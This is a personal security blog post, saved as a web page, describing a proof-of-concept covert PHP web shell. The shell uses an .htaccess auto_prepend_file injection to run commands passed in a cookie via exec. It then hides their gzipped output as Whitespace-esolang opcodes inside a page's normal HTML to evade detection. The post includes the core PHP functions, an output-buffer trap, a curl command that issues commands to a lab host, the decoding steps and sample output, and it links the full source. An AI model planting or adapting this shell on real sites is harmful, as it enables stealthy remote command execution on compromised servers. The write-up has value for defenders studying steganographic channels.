@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='I&#8217;ve been always a fan of esoteric programming languages (esolangs). These programming languages are generally made just for fun, mostly in universities or for challenges. Wikipedia describes as the following:
+ An esoteric programming language (esolang, in short) is a programming language designed to test the boundaries of computer programming language design, as a proof of concept, or as a joke. The use of esoteric distinguishes these languages from programming languages that working developers use to write software.'>
+
+<meta property='og:title' content='Whitespace Esolang Covert Channel / Steganography • wroot'>
+<meta property='og:description' content='I&#8217;ve been always a fan of esoteric programming languages (esolangs). These programming languages are generally made just for fun, mostly in universities or for challenges. Wikipedia describes as the following:
+ An esoteric programming language (esolang, in short) is a programming language designed to test the boundaries of computer programming language design, as a proof of concept, or as a joke. The use of esoteric distinguishes these languages from programming languages that working developers use to write software.'>
+<meta property='og:url' content='http://wroot.org/posts/whitespace-esolang-covert-channel-steganography/'>
+<meta property='og:site_name' content='wroot'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='covert channel'><meta property='article:tag' content='esolang'><meta property='article:tag' content='php'><meta property='article:tag' content='steganography'><meta property='article:tag' content='whitespace'><meta property='article:published_time' content='2014-02-19T14:31:02Z'/><meta property='article:modified_time' content='2014-02-19T14:31:02Z'/><meta name='twitter:card' content='summary'><meta name='twitter:site' content='@jseidl'>
+
+<meta name="generator" content="Hugo 0.53" />
+
+  <title>Whitespace Esolang Covert Channel / Steganography • wroot</title>
+  <link rel='canonical' href='http://wroot.org/posts/whitespace-esolang-covert-channel-steganography/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'><link rel='stylesheet' href='/webfonts/ptserif/main.css'><link rel='stylesheet' href='/webfonts/source-code-pro/main.css'><link rel='stylesheet' href='/css/style.css'>
+  
+
+</head>
+
+
+<body>
+<div id="container">
+    <header id="header">
+    <div id="header-outer" class="outer">
+        <div id="header-inner" class="inner">
+            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+            <a id="logo" class="logo-text" href="http://wroot.org/">wroot</a>
+            <nav id="main-nav">
+                
+                <a class="main-nav-link" href="/about/">About</a>
+                
+                <a class="main-nav-link" href="/talks/">Talks</a>
+                
+                <a class="main-nav-link" href="/projects/">Projects</a>
+                
+                <a class="main-nav-link" href="/press/">Press</a>
+                
+                <a class="main-nav-link" href="https://twitter.com/jseidl">Twitter</a>
+                
+                <a class="main-nav-link" href="https://www.linkedin.com/in/janseidl">LinkedIn</a>
+                
+                <a class="main-nav-link" href="http://github.com/jseidl">GitHub</a>
+                
+                <a class="main-nav-link" href="http://www.slideshare.net/jseidl/">SlideShare</a>
+                
+            </nav>
+            <nav id="sub-nav">
+                <div id="search-form-wrap">
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+    <section id="main" class="outer">
+        <article class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        <header class="article-header">
+            <h1 class="article-title" itemprop="name">Whitespace Esolang Covert Channel / Steganography</h1>
+        </header>
+        
+        <div class="article-meta">
+            
+            <a href="/posts/whitespace-esolang-covert-channel-steganography/" class="article-date">
+                <time datetime='2014-02-19T14:31:02.000&#43;00:00' itemprop="datePublished">2014-02-19</time>
+            </a>
+            
+            
+            
+            <div class="post-categories">
+                <div class="article-category">
+                    
+                    
+                    <a class="article-category-link" href="http://wroot.org//categories/malware">Malware</a>
+                    
+                    
+                    <span>&gt;</span>
+                    
+                    <a class="article-category-link" href="http://wroot.org//categories/penetration-testing">Penetration Testing</a>
+                    
+                    
+                    <span>&gt;</span>
+                    
+                    <a class="article-category-link" href="http://wroot.org//categories/steganography">Steganography</a>
+                    
+                </div>
+            </div>
+            
+            
+        </div>
+        <div class="article-entry" itemprop="articleBody">
+            
+
+<p>I&#8217;ve been always a fan of <a href="http://en.wikipedia.org/wiki/Esoteric_programming_language" target="_blank">esoteric programming languages (esolangs)</a>. These programming languages are generally made just for fun, mostly in universities or for challenges. <a href="http://www.wikipedia.org" target="_blank">Wikipedia</a> describes as the following:</p>
+
+<blockquote>
+<p>An esoteric programming language (esolang, in short) is a programming language designed to test the boundaries of computer programming language design, as a proof of concept, or as a joke. The use of esoteric distinguishes these languages from programming languages that working developers use to write software.</p>
+</blockquote>
+
+<p>You&#8217;ve probably seen some of the famous ones like <a href="http://en.wikipedia.org/wiki/Brainfuck" target="_blank">brainfuck</a> and <a href="http://en.wikipedia.org/wiki/Shakespeare_(programming_language)" target="_blank">shakespeare</a> language. Some months ago I stumbled upon this funny one called &#8220;<a href="http://en.wikipedia.org/wiki/Whitespace_%28programming_language%29" target="_blank">Whitespace</a>&#8220;.</p>
+
+<h2 id="about-whitespace-esolang">About Whitespace esolang</h2>
+
+<p>Whitespace is an esolang created by Edwin Brady and Chris Morris from the University of Durham in released in 2003. Their opcodes consists only of <strong>spaces</strong>, <strong>tabs</strong> and <strong>line-feeds</strong>. Interesting, huh?</p>
+
+<p>Here&#8217;s a sample <em>Hello, World!</em> program in Whitespace <em>(red = spaces, blue = tabs, black = VIM cursor)</em>:</p>
+
+<p><img src="https://wroot.org/wp/wp-content/uploads/2014/02/Whitespace_in_vim21.png" alt="Whitespace" width="500" height="306" class="aligncenter size-full wp-image-8918" srcset="https://wroot.org/wp/wp-content/uploads/2014/02/Whitespace_in_vim21.png 500w, https://wroot.org/wp/wp-content/uploads/2014/02/Whitespace_in_vim21-300x183.png 300w" sizes="(max-width: 500px) 100vw, 500px" /></p>
+
+<p>This &#8220;feature&#8221; came into my mind as a very difficult pattern to detect through computational means since the language natively discards every other character permitting this language to be merged arbitrarily with any other text&#8230;. and even some code ;)</p>
+
+<p>I&#8217;ve then remembered that <acronym title="HyperText Markup Language">HTML</acronym> has cool workarounds with repeated spaces and tabs when it comes to parsing and rendering, so I could be able to inject Whitespace opcodes into <acronym title="HyperText Markup Language">HTML</acronym> without breaking it and with minor rendering quirks.</p>
+
+<p>So the weather was crappy, beer was over and I decided to make a covert shell with that.</p>
+
+<h2 id="creating-the-covert-shell">Creating the covert shell</h2>
+
+<p><acronym title="Pre-Hypertext Processing">PHP</acronym> is one of the most used languages in websites and power popular platforms like WordPress and MediaWiki. <acronym title="Pre-Hypertext Processing">PHP</acronym> has an output buffering system (<code>ob_start</code>, <code>ob_get_contents</code> etc) and a widely abused feature called <code>auto_prepend_file</code>. These would be enough to setup my covert shell.</p>
+
+<p>I quickly spawned two files, one <code>&lt;a href=&quot;https://github.com/jseidl/whitespace/blob/master/wcc/.htaccess&quot; target=&quot;_blank&quot;&gt;.htaccess&lt;/a&gt;</code> to handle my shell injection via <code>auto_prepend_file</code> (very known and old trick) and one <code>&lt;a href=&quot;https://github.com/jseidl/whitespace/blob/master/wcc/wcc.php&quot; target=&quot;_blank&quot;&gt;wcc.php&lt;/a&gt;</code> to do the magic.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-apacheconf" data-lang="apacheconf">php_value auto_prepend_file <span style="color:#e6db74">&#34;wcc.php&#34;</span></code></pre></div>
+
+<p>This would ensure my shell works on <strong>almost any php page</strong> on the target acessible through the browser.</p>
+
+<p>First thing I had to do was ensure that the I&#8217;ve <strong>got the output buffer after all other possible output buffer handlers</strong> had processed it. There&#8217;s quite a time since I left web developing but I did remembered about <code>&lt;a href=&quot;http://www.php.net/manual/en/function.register-shutdown-function.php&quot; target=&quot;_blank&quot;&gt;register_shutdown_function&lt;/a&gt;</code> that is used to, you know, register functions that will run before the script exits.</p>
+
+<p>I could&#8217;ve stopped there, but I&#8217;ve wanted to prevent other <code>register_shutdown_functions</code> to win the race and alter the output after I did, so <a href="http://www.php.net/manual/en/function.register-shutdown-function.php#98200" target="_blank">I did some research</a> and saw that if you call <code>register_shutdown_function</code> from a <code>register_shutdown_function</code>, it will have high chances of being the last shutdown function (unless other <code>register_shutdown_function</code> did the same trick).</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function wcc_init() {
+	# ... snip ...
+
+	# Register shutdown function that registers a 
+	# shutdown function as last in chain ;)
+	# (unless another shutdown functions does the same)
+	register_shutdown_function(&#39;wcc_shutdown&#39;, $cmd_output);
+}//end :: wcc_init</code></pre></div>
+
+<p>And further down&#8230;</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function wcc_shutdown($whitespace_payload) {
+	register_shutdown_function(&#39;wcc_merge_output&#39;, $whitespace_payload); # register last ;)
+}//end :: wcc_shutdown</code></pre></div>
+
+<p>That took care of ensuring that my <code>wcc_merge_output</code> function will run at the very end of any script.</p>
+
+<p>Now it&#8217;s time to play with the output buffer and do the whitespace magic. I&#8217;ve placed <code>ob_start</code> on my <code>wcc_init</code> function that is prepended by <code>.htaccess</code> so as soon as script starts, output buffering is enabled.</p>
+
+<p>If the magic cookie key is set, it will run the command with <code>exec</code> (for testing purposes, you can change to whichever method you want), <code>gzdeflate</code>-it and convert to whitespace language.</p>
+
+<p>I won&#8217;t comment on the actual code responsible to converting from <acronym title="American Standard Code for Information Interchange">ASCII</acronym> to Whitespace but FYI, it basically converts each char to binary, pushes each character to Whitespace Stack, then adds &#8220;print char from stack&#8221; N times, where <code>N = len(string)</code> and finally adds the &#8220;end program&#8221; sentence.</p>
+
+<p>_You can read more about the internals of Whitespace Language on the <a href="http://compsoc.dur.ac.uk/whitespace/tutorial.php" target="_blank">official page&#8217;s tutorial</a>. If you&#8217;re interested, you can check the <code>&lt;a href=&quot;https://github.com/jseidl/whitespace/blob/master/wcc/wcc.php#L178&quot; target=&quot;_blank&quot;&gt;wcc_whitespace_print_string&lt;/a&gt;</code> function source-code._</p>
+
+<p>The <code>wcc_init</code> function ended up looking like this:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function wcc_init() {
+	if (
+		!isset($_COOKIE[WCC_COOKIE_KEY]) ||
+		empty($_COOKIE[WCC_COOKIE_KEY])
+	) return false;
+
+	ob_start();
+
+	$cmd_output = wcc_exec($_COOKIE[WCC_COOKIE_KEY]);
+
+	register_shutdown_function(&#39;wcc_shutdown&#39;, $cmd_output);
+
+	return true;
+
+}//end :: wcc_init</code></pre></div>
+
+<p>When the original script finishes its job and execution is passed to my shutdown function, <code>wcc_merge_output</code> will grab the contents of the output buffer, merge, display and exit.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function wcc_merge_output($whitespace_payload) {
+
+	$page_content = ob_get_contents();
+	ob_end_clean();
+
+	# &#34;Sanitize&#34; page content and tokenize
+	# ... snip ...
+
+	# Build Content
+	$final_content = wcc_build_content($whitespace_tokens, $content_tokens);
+
+	# Show content <span style="color:#960050;background-color:#1e0010">&amp;</span> exit
+	print $final_content;
+	exit(0);
+
+}//end :: wcc_merge_output</code></pre></div>
+
+<h2 id="the-caveat">The caveat</h2>
+
+<p>Of course, nothing comes easy. I decided to test the <strong>WCC</strong> on a real (little old) WordPress install so I pulled up an old VM that I had it installed.</p>
+
+<p>My buffer was being ignored or duplicated, depending on the page. Turns out I did not account the race condition that other codes might introduce when handling output buffer and they were flushing the buffer before I could act, so I created a little trap to prevent others from messing with it.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"># in script start
+global $buffer; 
+
+# in wcc_init()
+# this trap will be called when something 
+# tries to display the output buffer
+ob_start(&#34;wcc_output_trap&#34;); 
+
+# Trap function added
+# Someone tries to output the buffer before us
+# and ... &lt;<span style="color:#f92672">acronym</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Oh my goodness&#34;</span>&gt;OMG&lt;/<span style="color:#f92672">acronym</span>&gt;! IT&#39;S A TRAP!
+function wcc_output_trap($current_buffer) {
+    global $buffer;
+    $buffer .= $current_buffer; # let&#39;s save it for later
+    return &#39;&#39;; # prevents showing the buffer yet
+}//end :: wcc_output_trap
+
+# in wcc_merge_output()
+$page_content = $buffer.ob_get_contents(); # now we can show everything</code></pre></div>
+
+<p>As from the documentation for the <code>callback</code> parameter from <code>ob_start</code>:</p>
+
+<blockquote>
+<p>The function will be called when the output buffer is flushed (sent) or cleaned (with ob_flush(), ob_clean() or similar function) or when the output buffer is flushed to the browser at the end of the request.</p>
+</blockquote>
+
+<p>That did the trick.</p>
+
+<h2 id="the-sanitization-and-tokenization-process-is-quite-simple">The sanitization and tokenization process is quite simple.</h2>
+
+<p>For content, first I replace all <strong>tabs</strong> to <strong>spaces</strong>, place each line in an array with respective line number as index. Then I remove the linefeeds from the each line and break the line into tokens separated by spaces.</p>
+
+<p>For whitespace, I just convert a string to an array of characters. Dead simple.</p>
+
+<h2 id="merging-content">Merging content</h2>
+
+<p>This is quite simple also. For each whitespace token (character/opcode), I add one of the content parts (tokens) followed by the whitespace token.</p>
+
+<p>If whitespace payload is less than content, when I finish adding whitespace tokens, I just add the remaining pieces glued toghether by spaces and keep their line feeds.</p>
+
+<p>If whitespace payload is greater than content, I just add raw whitespace payload to the end of the <acronym title="HyperText Markup Language">HTML</acronym> content. This brings up some issues on detection but it&#8217;s better than no output at all. Just choose a page with more content.</p>
+
+<p>You can check it out the <a href="https://github.com/jseidl/whitespace/blob/master/wcc/wcc.php#L92">source-code of this routine</a>.</p>
+
+<h2 id="issuing-requests-to-the-shell">Issuing requests to the shell</h2>
+
+<p>In this PoC I&#8217;ve used the classic <code>Cookie</code> command input trick.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">define(&#39;WCC_COOKIE_KEY&#39;, &#39;wcc_cmd&#39;);
+$_COOKIE[WCC_COOKIE_KEY];</code></pre></div>
+
+<p>So through a shell, you can do something like</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -s -H <span style="color:#e6db74">&#39;Cookie: wcc_cmd=id&#39;</span> http://10.1.1.100/wcc/ -o out.html</code></pre></div>
+
+<p>Then parse with any Whitespace interpreter and inflate the payload again</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./wspace out.html | head -n -3 | php inflate.php</code></pre></div>
+
+<p><em><code>&lt;a href=&quot;https://github.com/jseidl/whitespace/blob/master/wcc/inflate.php&quot; target=&quot;_blank&quot;&gt;inflate.php&lt;/a&gt;</code> reads input from <code>stdin</code> and passes to <code>gzinflate</code>.</em></p>
+
+<h2 id="result">Result?</h2>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">=</span> WCC <span style="color:#f92672">=</span> Command output <span style="color:#f92672">==========================</span>
+
+uid<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span><span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span><span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span><span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+ 
+<span style="color:#f92672">=</span> WCC <span style="color:#f92672">=</span> &lt;acronym title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;End of file&#34;</span>&gt;EOF&lt;/acronym&gt; <span style="color:#f92672">=====================================</span></code></pre></div>
+
+<h2 id="visual-differences">Visual Differences</h2>
+
+<p>For some content you might get some quirks, for others, not.</p>
+
+<p>Here&#8217;s a screenshot from both pages sources. First with embedded Whitespace command output and the second is the original.</p>
+
+<p><a href="https://wroot.org/wp/wp-content/uploads/2014/02/w2.png"><img src="https://wroot.org/wp/wp-content/uploads/2014/02/w2-300x179.png" alt="Whitespace HTML Source Comparison" width="300" height="179" class="aligncenter size-medium wp-image-8927" srcset="https://wroot.org/wp/wp-content/uploads/2014/02/w2-300x179.png 300w, https://wroot.org/wp/wp-content/uploads/2014/02/w2-1024x613.png 1024w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+
+<p>Here&#8217;s a screenshot from both pages rendered <acronym title="HyperText Markup Language">HTML</acronym>. First with embedded Whitespace command output and the second is the original. (Don&#8217;t mind the images, this theme has random header images)</p>
+
+<p><a href="https://wroot.org/wp/wp-content/uploads/2014/02/w1.png"><img src="https://wroot.org/wp/wp-content/uploads/2014/02/w1-300x167.png" alt="Whitespace Rendered HTML Comparison" width="300" height="167" class="aligncenter size-medium wp-image-8926" srcset="https://wroot.org/wp/wp-content/uploads/2014/02/w1-300x167.png 300w, https://wroot.org/wp/wp-content/uploads/2014/02/w1-1024x570.png 1024w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+
+<h2 id="size-discrepancies">Size discrepancies</h2>
+
+<p>Since we&#8217;re mostly changing stuff than adding, our file size ends up very close to the original if you have enought <acronym title="HyperText Markup Language">HTML</acronym> to fit your command output. Below is the comparison of the original <acronym title="HyperText Markup Language">HTML</acronym> with one with the output from some commands.</p>
+
+<p>I&#8217;ve ran <code>id</code>, <code>ip a show</code>, <code>ps aux</code> and <code>ls -al</code>. <code>id</code> was the only one that fit entirely in the <acronym title="HyperText Markup Language">HTML</acronym> I&#8217;ve got (pretty short page). The others resulted in raw whitespace appended to the end of the original <acronym title="HyperText Markup Language">HTML</acronym>.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;pre lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bash&#34;</span>&gt;$ ls -al /tmp/<span style="color:#f92672">{</span>original,cmd*<span style="color:#f92672">}</span>.html
+-rw-rw-r-- <span style="color:#ae81ff">1</span> jseidl jseidl <span style="color:#ae81ff">14778</span> Feb <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">20</span>:47 /tmp/original.html
+-rw-rw-r-- <span style="color:#ae81ff">1</span> jseidl jseidl <span style="color:#ae81ff">14191</span> Feb <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">20</span>:36 /tmp/cmd_id.html
+-rw-rw-r-- <span style="color:#ae81ff">1</span> jseidl jseidl <span style="color:#ae81ff">16986</span> Feb <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">20</span>:50 /tmp/cmd_ip_a_show.html
+-rw-rw-r-- <span style="color:#ae81ff">1</span> jseidl jseidl <span style="color:#ae81ff">19013</span> Feb <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">20</span>:50 /tmp/cmd_ls_al.html
+-rw-rw-r-- <span style="color:#ae81ff">1</span> jseidl jseidl <span style="color:#ae81ff">41000</span> Feb <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">20</span>:50 /tmp/cmd_ps_aux.html</code></pre></div>
+
+<p><em><acronym title="Laughing out loud">LOL</acronym>. In some cases it even &#8220;minifies&#8221; a little&#8230;</em></p>
+
+<h2 id="final-notes">Final notes</h2>
+
+<ul>
+<li>I did not put any effort on encoding/encrypting the cookie or commands or whatever. This is only to test the covert response channel.</li>
+<li>I also know that cookie based command passing is easily detectable. And are many other better ways to do that.</li>
+<li>Of course there are better methods than <code>exec</code> to run code. This is also not the point of this research.</li>
+</ul>
+
+<h2 id="source-code-files">Source code &amp; files</h2>
+
+<p>All files are available on my <a href="https://github.com/jseidl/whitespace/tree/master/wcc" target="_blank">github repo</a>. Feel free to download, play, fork, whatever.</p>
+
+        </div>
+
+        
+        
+        <div class="article-toc" >
+            <h3>Contents</h3>
+            <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#about-whitespace-esolang">About Whitespace esolang</a></li>
+<li><a href="#creating-the-covert-shell">Creating the covert shell</a></li>
+<li><a href="#the-caveat">The caveat</a></li>
+<li><a href="#the-sanitization-and-tokenization-process-is-quite-simple">The sanitization and tokenization process is quite simple.</a></li>
+<li><a href="#merging-content">Merging content</a></li>
+<li><a href="#issuing-requests-to-the-shell">Issuing requests to the shell</a></li>
+<li><a href="#result">Result?</a></li>
+<li><a href="#visual-differences">Visual Differences</a></li>
+<li><a href="#size-discrepancies">Size discrepancies</a></li>
+<li><a href="#final-notes">Final notes</a></li>
+<li><a href="#source-code-files">Source code &amp; files</a></li>
+</ul></li>
+</ul>
+</nav>
+        </div>
+        
+        
+
+        
+
+
+        
+        <footer class="article-footer">
+            <ul class="article-tag-list">
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/covert-channel">covert channel
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/esolang">esolang
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/php">php
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/steganography">steganography
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/whitespace">whitespace
+                    </a>
+                </li>
+                
+            </ul>
+        </footer>
+        
+    </div>
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wroot" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    <nav id="article-nav">
+    
+    <a href="/posts/goldeneye-2-1-released-with-even-more-randomness/" id="article-nav-newer" class="article-nav-link-wrap">
+        <div class="article-nav-title"><span>&lt;</span>&nbsp;
+            GoldenEye 2.1 released with even more randomness
+        </div>
+    </a>
+    
+    
+    <a href="/press/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">Press&nbsp;<span>&gt;</span></div>
+    </a>
+    
+</nav>
+</article>
+
+        
+    </section>
+    <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2019 wroot&nbsp;
+            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with (a slightly modified) theme <a href="https://github.com/carsonip/hugo-theme-minos">Minos</a>
+        </div>
+    </div>
+    
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    <script>
+        document.getElementById('main-nav-toggle').addEventListener('click', function () {
+            var header = document.getElementById('header');
+            if (header.classList.contains('mobile-on')) {
+                header.classList.remove('mobile-on');
+            } else {
+                header.classList.add('mobile-on');
+            }
+        });
+    </script>
+</footer>
+
+</div>
+</body>
+</html>
